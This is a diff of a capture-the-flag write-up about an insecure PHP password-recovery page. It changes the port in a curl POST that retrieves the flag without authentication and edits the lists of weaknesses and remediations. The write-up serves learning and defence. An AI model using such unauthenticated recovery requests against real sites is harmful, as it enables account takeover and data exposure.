@@ -5,10 +5,10 @@
 
 ## Summary
 
-page: `http://localhost:8080/index.php?page=recover`
+page: `http://localhost:8081/index.php?page=recover`
 commands:
 ```bash
-curl -X POST "http://localhost:8080/index.php?page=recover" \
+curl -X POST "http://localhost:8081/index.php?page=recover" \
      -d "mail=anything@example.com&Submit=Submit" | grep flag
 ```
 Any email address that differs from the default returns the flag.
@@ -55,17 +55,16 @@ The above command works anytime—no authentication required. No need to inspect
 2. **No rate limiting** – Brute-forceable (could enumerate valid email accounts)
 3. **Exposes sensitive info** – Flag returned directly without verification
 4. **No CSRF protection** – POST request has no token validation
-5. **No OTP/token** – Should send unique recovery link, not immediate flag
+
 
 ## Remediation
 1. **Implement email verification** – Send a unique, time-limited recovery token (expires in 15-30 min)
 2. **Rate limiting** – Limit password recovery requests per email/IP (e.g., 3 per hour)
 3. **Never expose secrets directly** – Return recovery link, not flags or credentials
-4. **Add CSRF tokens** – Validate `csrf_token` on password recovery forms
+4. **Add CSRF tokens** – Validate `csrf_token` on password recovery forms - CSRF Token (Cross-Site Request Forgery Token)
 5. **Log recovery attempts** – Monitor suspicious patterns (multiple emails, rapid requests)
 6. **Use HTTPS only** – Encrypt recovery tokens in transit
 7. **Implement MFA** – Require second factor for sensitive operations
-8. **No security questions** – They provide weak verification (knowledge-based answers are guessable)
 
 
 
